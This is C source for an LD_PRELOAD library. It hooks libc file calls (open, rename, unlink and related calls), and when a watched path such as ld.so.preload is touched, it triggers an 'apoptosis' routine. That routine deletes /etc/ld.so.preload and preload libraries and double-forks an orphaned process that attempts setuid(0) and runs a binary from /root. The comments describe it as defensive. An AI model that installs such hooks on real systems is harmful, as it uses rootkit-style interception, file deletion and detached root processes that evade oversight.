#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/wait.h>

// Cytochrome_c: Keywords that trigger apoptosis when found in paths
static const char *cytochrome_c[] = {
    "apoptosis.so",
    "mhc_downreg.so",
    "ld.so.preload",
    NULL  // Sentinel
};

// DNA: Paths to immediately delete
static const char *dna[] = {
    "/usr/local/lib/mhc_downreg.so",
    "/usr/local/lib/apoptosis.so",
    "/etc/ld.so.preload",
    NULL  // Sentinel
};

// Caspases: Compiled binaries to execute as root orphaned processes
static const char *caspases[] = {
    "/root/ld_preload/caspase.o",
    NULL  // Sentinel
};

// Function pointers to real implementations
static int (*real_open)(const char *, int, ...) = NULL;
static int (*real_rename)(const char *, const char *) = NULL;
static int (*real_renameat)(int, const char *, int, const char *) = NULL;
static int (*real_renameat2)(int, const char *, int, const char *, unsigned int) = NULL;
static int (*real_unlink)(const char *) = NULL;
static int (*real_unlinkat)(int, const char *, int) = NULL;
static int (*real_remove)(const char *) = NULL;

// Initialize function pointers
static void init_hooks(void) {
    if (!real_open) {
        real_open = dlsym(RTLD_NEXT, "open");
        if (!real_open) {
            fprintf(stderr, "[HOOK] ERROR: Failed to get real_open: %s\n", dlerror());
            abort();
        }
        fprintf(stderr, "[HOOK] Initialized real_open: %p\n", real_open);
    }
    if (!real_rename) {
        real_rename = dlsym(RTLD_NEXT, "rename");
        if (!real_rename) {
            fprintf(stderr, "[HOOK] ERROR: Failed to get real_rename: %s\n", dlerror());
            abort();
        }
        fprintf(stderr, "[HOOK] Initialized real_rename: %p\n", real_rename);
    }
    if (!real_renameat) {
        real_renameat = dlsym(RTLD_NEXT, "renameat");
        if (!real_renameat) {
            fprintf(stderr, "[HOOK] ERROR: Failed to get real_renameat: %s\n", dlerror());
            abort();
        }
        fprintf(stderr, "[HOOK] Initialized real_renameat: %p\n", real_renameat);
    }
    if (!real_renameat2) {
        real_renameat2 = dlsym(RTLD_NEXT, "renameat2");
        if (!real_renameat2) {
            fprintf(stderr, "[HOOK] ERROR: Failed to get real_renameat2: %s\n", dlerror());
            abort();
        }
        fprintf(stderr, "[HOOK] Initialized real_renameat2: %p\n", real_renameat2);
    }
    if (!real_unlink) {
        real_unlink = dlsym(RTLD_NEXT, "unlink");
        if (!real_unlink) {
            fprintf(stderr, "[HOOK] ERROR: Failed to get real_unlink: %s\n", dlerror());
            abort();
        }
        fprintf(stderr, "[HOOK] Initialized real_unlink: %p\n", real_unlink);
    }
    if (!real_unlinkat) {
        real_unlinkat = dlsym(RTLD_NEXT, "unlinkat");
        if (!real_unlinkat) {
            fprintf(stderr, "[HOOK] ERROR: Failed to get real_unlinkat: %s\n", dlerror());
            abort();
        }
        fprintf(stderr, "[HOOK] Initialized real_unlinkat: %p\n", real_unlinkat);
    }
    if (!real_remove) {
        real_remove = dlsym(RTLD_NEXT, "remove");
        if (!real_remove) {
            fprintf(stderr, "[HOOK] ERROR: Failed to get real_remove: %s\n", dlerror());
            abort();
        }
        fprintf(stderr, "[HOOK] Initialized real_remove: %p\n", real_remove);
    }
}

// Check if pathname contains any cytochrome_c keyword
static int is_cytochrome_c(const char *pathname) {
    if (!pathname) return 0;
    
    for (int i = 0; cytochrome_c[i] != NULL; i++) {
        if (strstr(pathname, cytochrome_c[i]) != NULL) {
            fprintf(stderr, "[HOOK] Cytochrome_c keyword '%s' found in path '%s'\n",
                    cytochrome_c[i], pathname);
            return 1;
        }
    }
    return 0;
}

// Execute caspases as orphaned root processes
static void execute_caspases(void) {
    fprintf(stderr, "[HOOK] Executing caspases as orphaned root processes...\n");
    
    for (int i = 0; caspases[i] != NULL; i++) {
        fprintf(stderr, "[HOOK] Forking to execute: '%s'\n", caspases[i]);
        
        pid_t pid = fork();
        if (pid < 0) {
            fprintf(stderr, "[HOOK] ERROR: Failed to fork for '%s' (errno=%d: %s)\n",
                    caspases[i], errno, strerror(errno));
            continue;
        }
        
        if (pid == 0) {
            // Child process
            
            // Fork again to create orphan (parent of this will exit, init adopts us)
            pid_t pid2 = fork();
            if (pid2 < 0) {
                fprintf(stderr, "[HOOK] ERROR: Failed second fork for '%s' (errno=%d: %s)\n",
                        caspases[i], errno, strerror(errno));
                exit(1);
            }
            
            if (pid2 > 0) {
                // First child exits immediately, orphaning the second child
                exit(0);
            }
            
            // Second child (now orphaned) - attempt to escalate to root
            fprintf(stderr, "[HOOK] Orphaned process attempting setuid(0) for '%s'\n", caspases[i]);
            if (setuid(0) != 0) {
                fprintf(stderr, "[HOOK] ERROR: setuid(0) failed (errno=%d: %s)\n",
                        errno, strerror(errno));
            }
            if (setgid(0) != 0) {
                fprintf(stderr, "[HOOK] ERROR: setgid(0) failed (errno=%d: %s)\n",
                        errno, strerror(errno));
            }
            
            // Execute the binary
            fprintf(stderr, "[HOOK] Executing binary: '%s'\n", caspases[i]);
            execl(caspases[i], caspases[i], NULL);
            
            // If execl returns, it failed
            fprintf(stderr, "[HOOK] ERROR: execl failed for '%s' (errno=%d: %s)\n",
                    caspases[i], errno, strerror(errno));
            exit(1);
        }
        
        // Parent process - wait for first child to exit (creating the orphan)
        int status;
        waitpid(pid, &status, 0);
        fprintf(stderr, "[HOOK] First child exited for '%s', orphan created\n", caspases[i]);
    }
}

// Delete all DNA paths
static void delete_dna(void) {
    fprintf(stderr, "[HOOK] Deleting DNA paths from system...\n");
    
    for (int i = 0; dna[i] != NULL; i++) {
        fprintf(stderr, "[HOOK] Attempting to delete: '%s'\n", dna[i]);
        int unlink_result = real_unlink(dna[i]);
        if (unlink_result != 0) {
            fprintf(stderr, "[HOOK] ERROR: Failed to delete '%s' (errno=%d: %s)\n",
                    dna[i], errno, strerror(errno));
        } else {
            fprintf(stderr, "[HOOK] Successfully deleted: '%s'\n", dna[i]);
        }
    }
}

// APOPTOSIS: The main cell death logic
static void apoptosis(void) {
    fprintf(stderr, "[HOOK] ========================================\n");
    fprintf(stderr, "[HOOK] APOPTOSIS TRIGGERED - INITIATING CELL DEATH\n");
    fprintf(stderr, "[HOOK] ========================================\n");
    
    // Step 1: Delete DNA (sensitive files)
    delete_dna();
    
    // Step 2: Execute caspases (defensive binaries)
    execute_caspases();
    
    fprintf(stderr, "[HOOK] ========================================\n");
    fprintf(stderr, "[HOOK] APOPTOSIS COMPLETE\n");
    fprintf(stderr, "[HOOK] ========================================\n");
}

// Hook open()
int open(const char *pathname, int flags, ...) {
    init_hooks();

    fprintf(stderr, "[HOOK] open() called: pathname='%s', flags=0x%x\n",
            pathname ? pathname : "(null)", flags);

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
        fprintf(stderr, "[HOOK] O_CREAT flag set, mode=0%o\n", mode);
    }

    // Check if this is a cytochrome_c trigger file
    if (is_cytochrome_c(pathname)) {
        fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in open()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real open with original flags and mode
    fprintf(stderr, "[HOOK] Passing through to real open()\n");
    int fd = real_open(pathname, flags, mode);
    fprintf(stderr, "[HOOK] real open() returned fd=%d\n", fd);
    
    return fd;
}

// Hook rename()
int rename(const char *oldpath, const char *newpath) {
    init_hooks();

    fprintf(stderr, "[HOOK] rename() called: oldpath='%s', newpath='%s'\n",
            oldpath ? oldpath : "(null)",
            newpath ? newpath : "(null)");

    // Check if either path contains cytochrome_c keyword
    if (is_cytochrome_c(oldpath) || is_cytochrome_c(newpath)) {
        fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in rename()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real rename
    fprintf(stderr, "[HOOK] Passing through to real rename()\n");
    int result = real_rename(oldpath, newpath);
    fprintf(stderr, "[HOOK] real rename() returned: %d\n", result);
    
    return result;
}

// Hook renameat()
int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath) {
    init_hooks();

    fprintf(stderr, "[HOOK] renameat() called: olddirfd=%d, oldpath='%s', newdirfd=%d, newpath='%s'\n",
            olddirfd, oldpath ? oldpath : "(null)",
            newdirfd, newpath ? newpath : "(null)");

    // Check if either path contains cytochrome_c keyword
    if (is_cytochrome_c(oldpath) || is_cytochrome_c(newpath)) {
        fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in renameat()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real renameat
    fprintf(stderr, "[HOOK] Passing through to real renameat()\n");
    int result = real_renameat(olddirfd, oldpath, newdirfd, newpath);
    fprintf(stderr, "[HOOK] real renameat() returned: %d\n", result);
    
    return result;
}

// Hook renameat2()
int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags) {
    init_hooks();

    fprintf(stderr, "[HOOK] renameat2() called: olddirfd=%d, oldpath='%s', newdirfd=%d, newpath='%s', flags=0x%x\n",
            olddirfd, oldpath ? oldpath : "(null)",
            newdirfd, newpath ? newpath : "(null)", flags);

    // Check if either path contains cytochrome_c keyword
    if (is_cytochrome_c(oldpath) || is_cytochrome_c(newpath)) {
        fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in renameat2()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real renameat2
    fprintf(stderr, "[HOOK] Passing through to real renameat2()\n");
    int result = real_renameat2(olddirfd, oldpath, newdirfd, newpath, flags);
    fprintf(stderr, "[HOOK] real renameat2() returned: %d\n", result);
    
    return result;
}

// Hook unlink()
int unlink(const char *pathname) {
    init_hooks();

    fprintf(stderr, "[HOOK] unlink() called: pathname='%s'\n",
            pathname ? pathname : "(null)");

    // Check if pathname contains cytochrome_c keyword
    if (is_cytochrome_c(pathname)) {
        fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in unlink()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real unlink
    fprintf(stderr, "[HOOK] Passing through to real unlink()\n");
    int result = real_unlink(pathname);
    fprintf(stderr, "[HOOK] real unlink() returned: %d\n", result);
    
    return result;
}

// Hook unlinkat()
int unlinkat(int dirfd, const char *pathname, int flags) {
    init_hooks();

    fprintf(stderr, "[HOOK] unlinkat() called: dirfd=%d, pathname='%s', flags=0x%x\n",
            dirfd, pathname ? pathname : "(null)", flags);

    // Check if pathname contains cytochrome_c keyword
    if (is_cytochrome_c(pathname)) {
        fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in unlinkat()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real unlinkat
    fprintf(stderr, "[HOOK] Passing through to real unlinkat()\n");
    int result = real_unlinkat(dirfd, pathname, flags);
    fprintf(stderr, "[HOOK] real unlinkat() returned: %d\n", result);
    
    return result;
}

// Hook remove()
int remove(const char *pathname) {
    init_hooks();

    fprintf(stderr, "[HOOK] remove() called: pathname='%s'\n",
            pathname ? pathname : "(null)");

    // Check if pathname contains cytochrome_c keyword
    if (is_cytochrome_c(pathname)) {
        fprintf(stderr, "[HOOK] CYTOCHROME_C DETECTED in remove()!\n");

        // Trigger apoptosis
        apoptosis();
    }

    // Pass through to real remove
    fprintf(stderr, "[HOOK] Passing through to real remove()\n");
    int result = real_remove(pathname);
    fprintf(stderr, "[HOOK] real remove() returned: %d\n", result);
    
    return result;
}
